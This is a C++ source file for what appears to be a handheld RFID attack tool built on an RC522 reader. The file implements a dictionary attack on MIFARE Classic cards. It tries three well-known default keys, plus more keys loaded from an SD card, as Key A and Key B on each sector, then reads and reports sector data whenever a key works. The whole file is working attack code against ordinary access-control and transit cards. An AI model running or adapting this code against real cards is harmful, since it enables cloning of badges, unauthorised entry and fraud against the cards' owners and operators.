#include "attacks/dictionary_attack.h"
#include "hal/card_comm.h"
#include "core/key_store.h"
#include "output/serial_reporter.h"
#include "storage/sd_helper.h"
#include "config.h"
#include <SD.h>
#include <vector>
#include <stdlib.h>
#include <string.h>

static const uint8_t BUILTIN_KEYS_ARR[][6] = {
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
    {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
    {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}
};
static const char* BUILTIN_KEYS_HEX[] = {"FFFFFFFFFFFF","A0A1A2A3A4A5","D3F7D3F7D3F7"};

struct KeyEntry { uint8_t* k; char* hex; bool owned; };

static void _tryKey(CardDump* d, uint8_t sector, const uint8_t* key, const char* hex, bool isA) {
    (void)hex;
    uint8_t trailer = ks_sectorToTrailer(sector);
    reporter_attackStart("dictionary", sector, isA?"A":"B");
    RC522Status st = picc_mfAuth(isA?MF_AUTH_KEY_A:MF_AUTH_KEY_B, trailer, key, &d->uid);
    if (st==RC522_OK) {
        uint8_t buf[16];
        if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
            if (isA) ks_setKeyA(d, sector, key); else ks_setKeyB(d, sector, key);
            reporter_keyFound(sector, isA?"A":"B", key, "dictionary");
            reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
        }
        picc_mfDeauth();
    } else {
        reporter_keyFailed(sector, isA?"A":"B");
    }
}

void dictAttack_run(CardDump* d) {
    std::vector<KeyEntry> keys;
    size_t builtin_count = sizeof(BUILTIN_KEYS_ARR)/sizeof(BUILTIN_KEYS_ARR[0]);
    for (size_t i=0;i<builtin_count;i++) {
        keys.push_back({(uint8_t*)BUILTIN_KEYS_ARR[i], (char*)BUILTIN_KEYS_HEX[i], false});
    }

    if (sd_is_available()) {
        File f = SD.open(DICT_PATH);
        if (f) {
            while (f.available()) {
                String line = f.readStringUntil('\n');
                line.trim();
                if (line.length()==12) {
                    uint8_t* kop = (uint8_t*)malloc(6);
                    char* h = (char*)malloc(13);
                    if (!kop || !h) {
                        free(kop);
                        free(h);
                        break;
                    }
                    for (int i=0;i<6;i++) {
                        kop[i] = (uint8_t) strtoul(line.substring(i*2, i*2+2).c_str(), NULL, 16);
                    }
                    memcpy(h, line.c_str(),12); h[12]=0;
                    keys.push_back({kop, h, true});
                }
            }
            f.close();
        }
    }

    for (uint8_t s=0; s<d->totalSectors; s++) {
        if (ks_isSectorKnown(d,s)) continue;
        for (auto &ke: keys) {
            _tryKey(d, s, ke.k, ke.hex, true);
            if (ks_isSectorKnown(d,s)) break;
            _tryKey(d, s, ke.k, ke.hex, false);
            if (ks_isSectorKnown(d,s)) break;
        }
    }

    for (auto &ke: keys) {
        if (ke.owned) { free(ke.k); free(ke.hex); }
    }
}
